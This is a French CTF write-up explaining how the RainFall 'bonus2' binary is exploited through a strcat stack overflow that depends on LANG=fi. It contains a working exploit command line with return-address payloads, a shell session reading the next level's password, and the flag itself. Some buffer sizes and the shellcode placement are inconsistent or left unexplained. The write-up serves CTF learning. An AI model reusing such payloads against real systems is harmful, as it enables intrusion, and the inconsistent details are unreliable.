# Exploitation du binaire `bonus2` – Challenge CTF RainFall

## 🎯 Objectif

Exploiter une vulnérabilité de type **stack overflow** dans le programme `bonus2`, afin de prendre le contrôle du flux d’exécution et accéder au flag du niveau suivant.

---

## ✅ 1. Analyse statique initiale

### ⚠️ Protections binaires

```bash
checksec --file bonus2
```

**Résultat :**

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   bonus2
```

> Le binaire ne dispose d'aucune protection moderne. Il est vulnérable aux overflows classiques (pas de canary, NX, PIE...).

### 🔍 Fonctions sensibles (GOT/PLT)

On observe les fonctions suivantes liées dynamiquement :

* `strcat()` → vulnérable aux overflows
* `strncpy()` → utilisée pour copier les entrées utilisateur
* `getenv()` → permet d'utiliser des variables d'environnement

---

## 📊 2. Analyse dynamique et comportement de `main`

### Conditions d'exécution

```asm
cmp $0x3, [ebp+8] ; argc == 3 ?
je  continue
jmp exit
```

✅ Le programme attend **exactement deux arguments utilisateur** en plus du nom du programme, sinon il quitte.

### Structure mémoire

* Un buffer local de **76 octets** est alloué et mis à zéro.
* `argv[1]` est copié dans les **40 premiers octets**.
* `argv[2]` est copié dans les **36 octets suivants**.

```c
strncpy(buffer, argv[1], 40);
strncpy(buffer + 40, argv[2], 32);
```

### Analyse des usages

* Ce buffer est ensuite transmis à `greetuser()`.

---

## 🔎 3. Analyse de `greetuser()`

* Selon la valeur d'une variable globale, une chaîne est copiée dans un buffer local.
* Cette chaîne provient indirectement de `getenv("LANG")`.
* Puis, cette chaîne est **concaténée** au buffer passé en argument via `strcat()`.

```c
strcat(buffer, greeting);
puts(buffer);
```

### Problème critique

* `strcat()` suppose que `buffer` est bien terminé par `\0`, ce qui **n'est pas vérifié** ici.
* Si `argv[1]` et `argv[2]` remplissent tout le buffer (76 octets), la concaténation écrase la pile : **overflow !**

---

## ⚔️ 4. Construction de l'exploit

### Préparation

On choisit de :

* Fournir un `argv[1]` de **76 octets** ("A") pour remplir le buffer
* Fournir un `argv[2]` spécialement formé avec :

  * Padding : 18 octets ("B")
  * Adresse de retour intermédiaire : `0x08048637` (un `ret` neutre)
  * Adresse de shellcode : `0xbfffff2a` (dans la stack)

### Condition d'exécution : LANG doit être "fi"

```bash
export LANG=fi
```

### Lancement de l'exploit

```bash
./bonus2 \
  $(python -c 'print("A"*76)') \
  $(python -c 'print("B"*18 + "\x37\x86\x04\x08" + "\x2a\xff\xff\xbf")')
```

### Sortie attendue

```
Hyvää päivää AAAAAAAAAA...BBBBBB7*���
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

---

## 🔒 5. Conclusion

* Le binaire est une cible facile à exploiter : absence totale de protections.
* La méconnaissance de `strcat()` combinée à l'usage de `getenv()` et d'entrées non vérifiées rend l'exploit trivial.
* En reconstituant l'empilement de la stack, on définit un payload sur mesure pour prendre le contrôle du `ret` de `greetuser()`.

### 🏆 Flag obtenu

```
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

---

**Challenge :** RainFall / Bonus2
**Technique :** Stack overflow via `strcat()` + getenv("LANG")
